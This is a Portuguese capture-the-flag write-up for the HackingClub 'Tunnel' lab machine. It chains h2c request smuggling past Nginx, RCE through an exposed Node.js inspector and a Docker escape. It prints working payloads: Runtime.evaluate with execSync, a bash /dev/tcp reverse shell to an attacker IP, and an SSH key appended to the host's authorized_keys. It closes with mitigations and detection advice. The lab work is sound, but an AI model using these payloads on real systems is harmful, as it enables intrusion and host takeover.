---
title: Tunnel - Desafio Hacker [HackingClub]
description: 'Resolvendo máquina nível médio da Hacking Club sobre HTTP/2 cleartext (h2c) request smuggling, RCE e Docker escape'
author: matheus
tags: ["hackingclub", "WriteUps", "RCE", "request smuggling", "docker escape"]
categories: ["SecLab", "Hacking"]
pin: false
comments: true

---

# 📝 Writeup: Tunnel (HackingClub Machine) - Matheus Laidler

## HTTP/2 Cleartext Tunnel (h2c), Nginx Bypass, Node Inspector RCE e Docker Escape

## 1. Enumeração Inicial e Fuzzing

### 1.1 Scan de portas

<img width="800" alt="image" src="https://github.com/user-attachments/assets/47dffbac-2eea-4c65-b6b7-f51d8582842b" />

```bash
nmap -sV 172.16.3.113
```
<img width="800" alt="image" src="https://github.com/user-attachments/assets/3f824288-3cf3-486d-b3c8-f9a9ce516e10" />

```bash
rustscan -a 172.16.3.113
```

**Resultado da enumeração:**
Identificando duas portas abertas:

- Porta 22 (SSH)
- **Porta 8000 (HTTP)** ← Foco principal da análise

### 1.2 Fuzzing inicial

```bash
ffuf -c -u http://172.16.3.113:8000/FUZZ \
     -w ~/SecLists/Discovery/Web-Content/raft-large-words.txt -t 150
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/bcbd33eb-7cc2-4fab-8487-f15b40896f62" />

**Descobertas importantes:**

```text
/error      → Whitelabel Error Page
/actuator   → 403 Forbidden
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/c0539110-3f00-4079-82d6-18a82da77a50" />

**Análise técnica:**
A presença de "*Whitelabel Error Page*" e o diretório "*actuator*" indica **Spring Boot Framework**. Esta identificação nos permite usar wordlists específicas para enumerar endpoints do Spring Boot Actuator.

## 2. Enumeração específica para Spring Boot

### 2.1 Wordlist especializada

<img width="800" alt="image" src="https://github.com/user-attachments/assets/a953fe73-eb8f-4604-88cd-0c11afac6b24" />

```bash
ffuf -c -u http://172.16.3.113:8000/FUZZ \
     -w /home/matheus/SecLists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -t 150
```

**Resultados obtidos:**

- Diversos endpoints do Spring Boot encontrados (`/actuator/env`, `/actuator/heapdump`, etc.)
- **Todos retornando 403 Forbidden** → Filtrados pelo **Nginx reverse proxy**

**Conclusão da enumeração:**

✅ Backend expõe endpoints sensíveis  
❌ Nginx bloqueia requisições externas

## 3. Indicativo de HTTP/2 Tunnel / h2c

A descrição da máquina menciona **"HTTP/2 tunneling"**, indicando vulnerabilidade de **Request Smuggling** via HTTP/2 Cleartext (h2c).

## 4. HTTP/2 Cleartext Upgrade Bypass - h2c Smuggling

### 4.1 Conceitos fundamentais

**HTTP/2 Cleartext (h2c)** é uma extensão do protocolo HTTP/2 que permite comunicação sem TLS/SSL, utilizando o mecanismo de upgrade HTTP/1.1 definido na **RFC 7540**.

**Request Smuggling** é uma técnica que explora diferenças na interpretação de requisições HTTP entre proxies/load balancers e servidores backend, permitindo bypass de controles de segurança.

### 4.2 Cenário da vulnerabilidade

```text
cliente → nginx (HTTP/1.1 proxy) → backend (Spring Boot + h2c support)
```

### 4.3 Como o bypass funciona tecnicamente

1. **Cliente envia requisição de upgrade:**

   ```http
   GET / HTTP/1.1
   Host: target.com
   Connection: Upgrade, HTTP2-Settings
   Upgrade: h2c
   HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
   ```

2. **Nginx processa e repassa** a requisição porque:
   - Não valida adequadamente headers de upgrade H2C
   - Confia que o backend rejeitará upgrades inválidos  
   - Implementação de proxy não considera implicações de segurança do upgrade

3. **Backend (Spring Boot) responde com upgrade bem-sucedido:**

   ```http
   HTTP/1.1 101 Switching Protocols
   Connection: Upgrade
   Upgrade: h2c
   ```

4. **Nginx estabelece túnel TCP transparente** entre cliente e backend

5. **Tráfego subsequente bypassa completamente as ACLs do Nginx** pois:
   - Comunicação agora é HTTP/2 binário
   - Nginx não consegue mais inspecionar/filtrar requisições
   - Todas as regras de proxy_pass são ignoradas

<img width="800" alt="image" src="https://github.com/user-attachments/assets/1ab35a7c-a8c2-4924-a00b-7fc576e06535" />

### 4.4 Implicações de segurança do bypass

Isso permite acessar endpoints críticos do **Spring Boot Actuator** que estavam protegidos:

- **`/actuator/env`** - Exposição de variáveis de ambiente (credenciais, flags, configurações)
- **`/actuator/heapdump`** - Dump completo da memória heap da JVM  
- **`/actuator/threaddump`** - Estado atual de todas as threads
- **`/actuator/configprops`** - Propriedades de configuração da aplicação

**Riscos críticos do /heapdump:**

- Contém **toda a memória ativa** da aplicação Java
- Pode expor **senhas em texto claro**, tokens de sessão, dados de usuários
- Histórico de todas as requisições HTTP processadas  
- Strings de conexão com banco de dados
- Chaves criptográficas em memória

**Por que o Actuator é crítico:**
O Spring Boot Actuator fornece endpoints de monitoramento e gestão que **nunca deveriam ser expostos publicamente**. São destinados apenas para administração interna e debugging.

## 5. Exploração com h2csmuggler

### 5.1 Instalação e configuração

```bash
# Instalação da ferramenta python [github]
# clone do repositório feito para /home/matheus/tools/h2csmuggler 
cd tools #entrando na minha pasta tools dentro da home | se não tiver essa pasta crie com o "mkdir tools"
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2
#pip3 install h2 --break-system-packages
#pip3 install -r requirements.txt -> caso tenha o arquivo (nesse caso n precisa ter, apenas fzr com 'h2' direto)
python3 ./h2csmuggler.py -h

# Configurando alias para execução global
nano ~/.bashrc
# Adicionar no final do arquivo:
alias h2csmuggler='python3 ~/tools/h2csmuggler/h2csmuggler.py'
# Aplicando atalho
source ~/.bashrc
```

### 5.2 Testando vulnerabilidade

<img width="800" alt="image" src="https://github.com/user-attachments/assets/5cab71a2-5ca7-4906-8373-effa398878f3" />

```bash
h2csmuggler -x http://172.16.3.113:8000 --test
```

**Resultado:**

```text
[INFO] Success http://172.16.3.113:8000/ can be used for tunneling
```

### 5.3 Acessando endpoint bloqueado

```bash
h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator
```

**Resultado:**

- Acesso ao conteúdo JSON do Actuator ✅
- **Bypass confirmado** ✅

### 5.4 Explorando variáveis de ambiente

```bash
h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator/env
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/dd25fd9f-4122-4d15-9d60-81496f98a51a" />

Se formos ao final do arquivo poderemos identificar o JSON que esperamos do /env

## 6. Informações sensíveis encontradas no /actuator/env

<img width="800" alt="image" src="https://github.com/user-attachments/assets/aba4d6c3-4061-4527-8219-5b175216c2c8" />

Ao analisar o JSON retornado do `/env` (utilizando um formatter para melhor legibilidade), identificamos:

**🚩 PRIMEIRA FLAG ENCONTRADA:**

```text
hackingclub{c71b3ebb3e25f3c8304d90***************309a3f}
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/c05b08ba-cc27-4adc-9fb2-f205fe80af69" />

### 6.1 Endpoints importantes descobertos

Juntando o que encontramos anteriormente com esse json podemos identificar/mapear importantes pontos para exploração

<img width="800" height="699" alt="image" src="https://github.com/user-attachments/assets/94b837cd-1b99-446c-bc3b-e3995206f6b8" />

**Endpoints mapeados:**

- `/actuator/env`
- `/actuator/heapdump`  
- `NODE_DEBUG_HOST`
- `NODE_DEBUG_PATH`
- Rotas administrativas internas

**🔍 Endpoint crítico descoberto:**

```text
/admin/internal-web-socket-endpoint
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/6d4ff368-01bd-44a9-a930-c6800edf0530" />

### 6.2 Chrome DevTools Protocol (CDP) - Contexto técnico

O endpoint descoberto expõe o **Chrome DevTools Protocol**, um protocolo de debugging baseado em WebSocket usado por:

- Chrome DevTools
- Node.js Inspector  
- Puppeteer
- Ferramentas de automação de browser

**Como funciona:**

- Comunicação via WebSocket usando mensagens JSON
- Permite controle total sobre o runtime JavaScript
- Acesso a APIs de sistema através do contexto Node.js
- Originalmente projetado para debugging, mas pode ser abusado para RCE

**Domínios críticos do CDP:**

- **Runtime** - Execução de código JavaScript arbitrário
- **Debugger** - Controle de breakpoints e execução
- **Profiler** - Análise de performance  
- **Console** - Interação com console JavaScript

**⚠️ Implicação de segurança:**
CDP **nunca deve ser exposto publicamente** pois permite execução de código arbitrário com os privilégios do processo Node.js.

## 7. Explorando o modo debug do Node.js

### 7.1 Primeiro teste HTTP normal

```bash
GET http://172.16.3.113:8000/admin/internal-web-socket-endpoint/
```

**Retorno:**

```text
WebSocket request was expected
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/804f407a-ad91-45d9-a59d-ebfaf4d86ed5" />

**Análise:**

✅ Endpoint válido  
❌ HTTP não aceito — requer WebSocket

### 7.2 Tentando conexão WebSocket

<img width="800" alt="image" src="https://github.com/user-attachments/assets/814ab118-bb9c-494e-9ea3-37beadae9520" />

Utilizando o Postman para testar, vamos criar não apenas para WebSocket como também para HTTP :

<img width="800" alt="image" src="https://github.com/user-attachments/assets/ab46653e-c951-49eb-af92-f829429a53a3" />

**Testando WebSocket direto:**

```text
ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/
```

**Resultado:**

```text
Unexpected server response: 400
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/d1646138-3ed5-4d08-812d-a6fa3a577c14" />

**Conclusão:** Não é o WebSocket principal — falta descobrir o caminho correto.

## 8. Descobrindo WebSocket real via DevTools API

### 8.1 Como funciona o Node.js Inspector

O Node.js Inspector expõe uma API HTTP para discovery de sessões de debugging ativas:

**Endpoints padrão do Inspector:**

- `/json` ou `/json/list` - Lista sessões de debugging
- `/json/version` - Versão do protocolo  
- `/json/activate/<id>` - Ativa uma sessão
- `/ws/<id>` - WebSocket endpoint para debugging

### 8.2 Discovery da sessão ativa

Testando endpoint de discovery:

```bash
GET http://172.16.3.113:8000/admin/internal-web-socket-endpoint/json/list
```

**Resultado:**
JSON contendo informações da sessão de debugging:

```json
{
  "id": "7efa5220-45c7-44c2-b367-d9068de778bd",
  "title": "/app/server.js",
  "type": "node",
  "url": "file://app/server.js",  
  "webSocketDebuggerUrl": "ws://172.16.3.113/7efa5220-45c7-44c2-b367-d9068de778bd"
}
```

**Análise importante:**
A URL do WebSocket debug usa a raiz + ID. Como estamos acessando via `/admin/internal-web-socket-endpoint/`, devemos construir:

```text
ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/7efa5220-45c7-44c2-b367-d9068de778bd
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/d47d4b67-07eb-4888-acef-3f69381a0b8a" />

**✅ Conexão WebSocket aceita com sucesso no Postman.**

## 9. Obtendo RCE via Chrome DevTools Protocol

### 9.1 Testando estrutura da mensagem CDP

**Primeira tentativa:**

```json
{}
```

<img width="800" alt="image" src="https://github.com/user-attachments/assets/cd232c50-857d-4829-98e9-13b4f6232048" />

**Erros obtidos:**

- Falta campo obrigatório `id` (integer)
- Falta campo obrigatório `method` (string)

### 9.2 Estrutura correta do Chrome DevTools Protocol

Consultando a [documentação oficial](tunnel/https://chromedevtools.github.io/devtools-protocol/), a estrutura correta é:

```json
{
  "id": 1,
  "method": "Domain.methodName",
  "params": {
    "parameterName": "value"
  }
}
```

Conseguimos descobrir que é necessário na estrutura o "params", assim sendo, teremos que identificar não apenas um método como algum parâmetro para o mesmo, então devemos voltar para a documentação oficial e pesquisar e identificá-los.

**Método aparentemente crítico para RCE identificado:**
**`Runtime.evaluate`** indica permitir execução de JavaScript arbitrário.

### 9.3 Descobrindo parâmetros obrigatórios

Consultando [Runtime.evaluate](tunnel/https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate):

**Parâmetro obrigatório:** `expression` (string)

### 9.4 Testando execução de código

**Payload de teste:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "7*7;"
  }
}
```

**Resultado:**

```json
{
  "result": {
    "type": "number",
    "value": 49,
    "description": "49"
  }
}
```

✅ **Execução de JavaScript confirmada**  
✅ **RCE já é quase uma realidade, estamos muito próximo dele**

## 10. Payload RCE via child_process - Análise técnica

### 10.1 Como funciona a execução de comandos em Node.js

O Node.js fornece o módulo `child_process` para executar comandos do sistema operacional:

```javascript
const { exec, execSync } = require('child_process');

// Assíncrono
exec('whoami', (error, stdout, stderr) => {
  console.log(stdout);
});

// Síncrono  
const result = execSync('whoami').toString();
```

### 10.2 Construindo payload via DevTools Protocol

**Acessando `require` através do contexto global:**

```javascript
// Usando process.mainModule (deprecated mas funcional)
process.mainModule.require('child_process')

// Alternativa moderna
require('child_process')
```

**Resumindo payload:**

Ao chamarmos o processo/módulo principal `process.mainModule` teremos acesso ao módulo `require` e então incluir `child process` - a biblioteca do JS para execução de comando -, para assim chamar o método `exec` e, obviamente, executar o comando que queremos.

```javascript
process.mainModule.require('child_process').exec('COMANDO_DESEJADO')
```

A execução não pode quebrar o JSON e, portanto, precisamos colocar o comando escapando aspas. Vamos aproveitar e atualizar nosso payload com sincronização e string de saída.

**Por que trocar para execSync:**

- Execução síncrona = resposta imediata
- `.toString()` converte Buffer para string  
- Mais fácil de debuggar via CDP

### 10.3 Construção da payload final

**Adaptando payload - Escapando caracteres para JSON:**

```javascript
// Temos: process.mainModule.require('child_process').exec("");
//
// O comando que queremos executar inicialmente para identificação: id
//
// Modernizando
//  * process.require('child_process').exec("id");
// Adaptando
//  * process.require('child_process').execSync(\"id\").toString();
//
// Payload:
// process.require('child_process').execSync(\"id\").toString();
process.mainModule.require('child_process').execSync(\"id\").toString();
```

→ Trocaremos o .exec para .execSync, pois assim poderemos ver o output na hora, como falamos anteriormente;

→ Podemos adicionar o toString para colocar o output do comando em string;

→ Precisaremos evitar que o JSON não quebre escapando aspas *(\ " \ ")*;

**Payload completa:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "process.mainModule.require('child_process').execSync(\"id\").toString();"
  }
}
```

**Resultado:**

```text
uid=0(root) gid=0(root) groups=0(root)
```

🔥 **RCE como root dentro do container Node.js**

Agora basta apenas executarmos via bash nossa shell reversa para acessar a máquina

## 11. Estabelecendo Reverse Shell

### 11.1 Conceito técnico

Reverse shell inverte a direção típica de conexão:

- **Shell normal:** Cliente conecta ao servidor
- **Reverse shell:** Servidor conecta de volta ao cliente

**Vantagens:**

- Bypassa firewalls que bloqueiam conexões de entrada
- Funciona através de NAT/proxy  
- Mais difícil de detectar

### 11.2 Implementação

**Listener na máquina atacante:**

```bash
nc -lvnp 8000
```

**Payload via DevTools Protocol:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate", 
  "params": {
    "expression": "process.mainModule.require('child_process').execSync(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.30.175/8000 0>&1'\")"
  }
}
```

**Explicação da payload bash:**

- `bash -i` = Shell interativo
- `>&` = Redireciona stdout e stderr
- `/dev/tcp/IP/PORT` = Pseudo-device do bash para TCP  
- `0>&1` = Redireciona stdin também

✅ **Resultado: Shell reversa obtida como root no container**

## 12. Identificando container e melhorando TTY

### 12.1 Análise do ambiente

Explorando o ambiente obtido:

```bash
ls -la
```

**Indicadores de container Docker:**

- Hostname com ID randômico
- Presença do arquivo `/.dockerenv`

**Conclusão:** Estamos como root dentro de um container Docker, não na máquina principal. Necessário Docker Escape para a flag final.

### 12.2 Melhorando interação da shell

```bash
cd /root
ls -la  
which script  # ✅ Disponível
```

**Upgrade de TTY:**

```bash
script /dev/null -c bash
export TERM=xterm  
stty raw -echo && fg
```

### 12.3 Análise da topologia de rede

```bash
hostname -I  # IP interno do container
```

**Resultado:** `172.18.0.2`

**Interpretação da rede Docker:**

- Range `172.18.0.0/16` = Rede bridge customizada
- `172.18.0.1` = Gateway (provavelmente o host)  
- `172.18.0.2` = Nosso container atual
- Possíveis outros containers na mesma rede

**Opções de lateral movement:**

- **Network scanning** - `nmap 172.18.0.0/24`
- **Service discovery** - Procurar outros serviços internos
- **Docker escape** - Foco principal para acessar o host

### 12.4 Automatizando Docker security assessment

**deepce.sh** é uma ferramenta especializada em:

- Enumerar capabilities do container  
- Detectar possíveis vetores de escape
- Identificar configurações inseguras
- Testar permissões de arquivo/dispositivo

**Transferindo a ferramenta:**

**Na máquina atacante:**

```bash
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
python3 -m http.server 8000
```

**No container alvo:**

```bash
wget 10.0.30.175:8000/deepce.sh
chmod +x deepce.sh
./deepce.sh
```

### 12.5 Docker Capabilities e Containers Privilegiados

**Linux Capabilities** são um sistema de controle granular que divide os privilégios de root em unidades menores e específicas:

**Container normal:** Capabilities limitadas (ex: CAP_CHOWN, CAP_DAC_OVERRIDE)  
**Container privilegiado:** Todas as capabilities + acesso a devices do host

**Principais capabilities para escape:**

- **CAP_SYS_ADMIN** - Permite mount de filesystems
- **CAP_SYS_PTRACE** - Debug de processos do host  
- **CAP_SYS_MODULE** - Carregamento de módulos do kernel
- **CAP_DAC_READ_SEARCH** - Bypass de permissões de leitura

**Verificação sem capsh:**
Sem a ferramenta `capsh`, testamos capabilities indiretamente:

- Tentativa de mount → testa CAP_SYS_ADMIN
- Acesso a `/proc/1/` → testa visualização de processos do host  
- Listagem de `/dev/` → verifica acesso a devices

**Análise de partições:**

```bash
df -h
# fdisk -l não disponível no container
```

A partição de maior tamanho será nosso alvo para mount.

## 13. Docker Escape — Explorando Container Privilegiado

### 13.1 Técnica: Host Filesystem Mount

Em containers privilegiados, podemos montar partições do sistema host:

```bash
# Listar partições disponíveis
df -h
lsblk  # se disponível

# Tentar montar a partição principal do host  
mount /dev/nvme0n1p1 /mnt
```

**Por que isso funciona:**

- Container privilegiado tem **CAP_SYS_ADMIN**
- Acesso direto aos **device nodes** do host (`/dev/nvme0n1p1`)  
- Capability permite **mount de filesystems arbitrários**

**Resultado:**

✅ Mount bem-sucedido → Container é privilegiado  
✅ `/mnt` agora contém o **filesystem completo do host**  
✅ `/mnt/root` = diretório `/root` do sistema hospedeiro

### 13.2 Alternativas de escape (se mount falhasse)

- **Shared PID namespace** → `nsenter` para processos do host
- **Socket do Docker** → `docker -H unix://var/run/docker.sock run`  
- **Device access** → Escrita direta em `/dev/sda`
- **Kernel modules** → Carregamento de LKM malicioso

### 13.3 Acesso ao host via SSH (método alternativo)

**Gerando chave SSH:**

```bash
ssh-keygen -t rsa -f rsa
```

**Copiando chave para authorized_keys do host:**

```bash
echo "<base64_da_chave_publica>" | base64 -d >> /mnt/root/.ssh/authorized_keys
```

**Acesso SSH direto ao host:**

```bash
ssh -i rsa root@<IP_HOST>
```

✅ **Root no host**  
✅ **Comprometimento total**

## 14. Acesso à flag final

Com acesso completo ao filesystem do host via mount:

```bash
cd /mnt/root  
ls -la
cat root.txt
```

**🚩 SEGUNDA FLAG ENCONTRADA:**

```text
hackingclub{d349c11e22a06b34d04e58***************6a0d302}
```

## 15. Análise do ambiente pós-exploração

### 15.1 Verificando configurações Nginx

```bash
cat /mnt/path/to/Dockerfile.proxy
```

**Análise:** Nginx baseado na imagem oficial, copiando `conf/nginx.conf` para `/etc/nginx/conf.d/default.conf`

```bash
cat /mnt/path/to/conf/nginx.conf
```

**Configurações confirmadas:**

- Bloqueio explícito de `/actuator`  
- Permissão para header `Upgrade: h2c`
- Proxy para diferentes backends:
  - backend (Spring Boot)
  - internal (Node debugging endpoint)

### 15.2 Verificando configuração Spring Boot

```bash
cat /mnt/path/to/spring/src/main/resources/application.yaml
```

**Configuração crítica confirmada:**

```yaml
server:
  http2:
    enabled: true
```

**Análise:** Requisito obrigatório para h2c smuggling — HTTP/2 deve estar habilitado no backend.

## 16. Análise técnica e mitigações

### 16.1 Chain de exploração

1. **Enumeração** → Identificação de Spring Boot + Nginx proxy reverso
2. **h2c Smuggling** → Bypass de ACL através de HTTP/2 Cleartext upgrade  
3. **Actuator exposure** → Descoberta de informações sensíveis e endpoints internos
4. **Chrome DevTools Protocol** → Exploração de WebSocket de debugging Node.js
5. **RCE via CDP** → Execução de JavaScript com child_process  
6. **Container privilegiado** → Docker escape via mount de filesystem
7. **Host compromise** → Acesso root completo ao sistema hospedeiro

### 16.2 Mitigações recomendadas

#### 16.2.1 HTTP/2 Cleartext (h2c)

- Desabilitar suporte a h2c em produção
- Configurar Nginx para rejeitar headers de upgrade H2C  
- Implementar validação rigorosa de protocolos no proxy

**Exemplo de configuração segura Nginx:**

```nginx
# Rejeitar explicitamente upgrades H2C
if ($http_upgrade ~* "h2c") {
    return 400;
}

# Remover headers perigosos
proxy_set_header Upgrade "";
proxy_set_header Connection "";
```

#### 16.2.2 Spring Boot Actuator

```yaml
management:
  endpoints:
    web:
      exposure:
        include: "health,info"  # Apenas endpoints seguros
  endpoint:
    health:
      show-details: never
  security:
    enabled: true  # Autenticação obrigatória
  server:
    port: 8081  # Porta administrativa separada
```

#### 16.2.3 Node.js DevTools

```javascript
// Nunca expor debugging em produção
if (process.env.NODE_ENV !== 'production') {
  require('inspector').open(9229, 'localhost', false);
}

// Ou verificação mais rigorosa
if (process.env.DEBUG_MODE === 'true' && process.env.NODE_ENV === 'development') {
  require('inspector').open(9229, '127.0.0.1', false);
}
```

#### 16.2.4 Docker Security

```yaml
# docker-compose.yml
services:
  app:
    # Segurança de container
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - CHOWN  # Apenas capabilities estritamente necessárias
    read_only: true  # Filesystem somente leitura
    user: "1000:1000"  # Usuário não-root
    
    # Isolamento de rede  
    networks:
      - app-network
    
    # Limites de recursos
    deploy:
      resources:
        limits:
          cpus: "0.5"
          memory: "512M"
```

**Dockerfile seguro:**

```dockerfile
FROM node:18-alpine

# Usuário não-privilegiado
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001

# Diretório de trabalho
WORKDIR /app

# Arquivos de aplicação
COPY --chown=nodejs:nodejs . .
RUN npm ci --only=production

# Usuário final
USER nodejs

# Porta não-privilegiada
EXPOSE 3000

CMD ["node", "server.js"]
```

### 16.3 Monitoramento e detecção

#### 16.3.1 Logs críticos para monitorar

```text
# Nginx - Tentativas de upgrade H2C
"Upgrade: h2c" in access_log

# Spring Boot - Acesso a Actuator
/actuator/* endpoints

# Docker - Montagem de filesystems  
mount operations in container logs

# Node.js - Debugging habilitado
inspector.open() calls
```

#### 16.3.2 Alertas recomendados

- Conexões WebSocket para endpoints administrativos
- Execução de comandos via child_process  
- Tentativas de mount dentro de containers
- Acessos a arquivos sensíveis (`/proc/1/`, `/.dockerenv`)

### 16.4 Conclusão técnica

Este cenário demonstra uma **cadeia crítica** onde múltiplas vulnerabilidades se combinam:

- **Misconfiguration** do proxy reverso  
- **Exposição de endpoints administrativos**
- **Debugging habilitado em produção**
- **Container com privilégios excessivos**

**Cada vulnerabilidade individualmente seria séria, mas combinadas resultaram em comprometimento total do ambiente.**

**Lições aprendidas:**

1. **Defense in Depth** - Múltiplas camadas de segurança são essenciais
2. **Least Privilege** - Containers nunca devem ser privilegiados em produção  
3. **Security by Design** - Endpoints de debugging/admin devem ser isolados
4. **Configuration Management** - Proxies devem validar rigorosamente protocolos

**Impacto final:** Comprometimento completo da infraestrutura através de uma cadeia de exploração bem executada.

---

<img width="800" alt="image" src="https://github.com/user-attachments/assets/31368014-08f4-4943-a1d6-521341f4c673" />


**Flags capturadas:**

1. `hackingclub{c71b3ebb3e25f3c8304d90***************309a3f}` (via /actuator/env)  
2. `hackingclub{d349c11e22a06b34d04e58***************6a0d302}` (via Docker escape)

**Técnicas utilizadas:**

- HTTP/2 Cleartext Smuggling
- Spring Boot Actuator enumeration  
- Chrome DevTools Protocol RCE
- Docker privilege escalation
- Host filesystem mounting

<img width="800" alt="image" src="https://github.com/user-attachments/assets/f0667214-3a4e-4ad9-b792-0d97287fb8ca" />

###### Nota: Mantive apenas visivel em foto uma flag (primeira), mas mantive a escrita levemente censurada no texto, agora já para a segunda flag nem imagem coloquei para estimula-los a botar a mão na massa.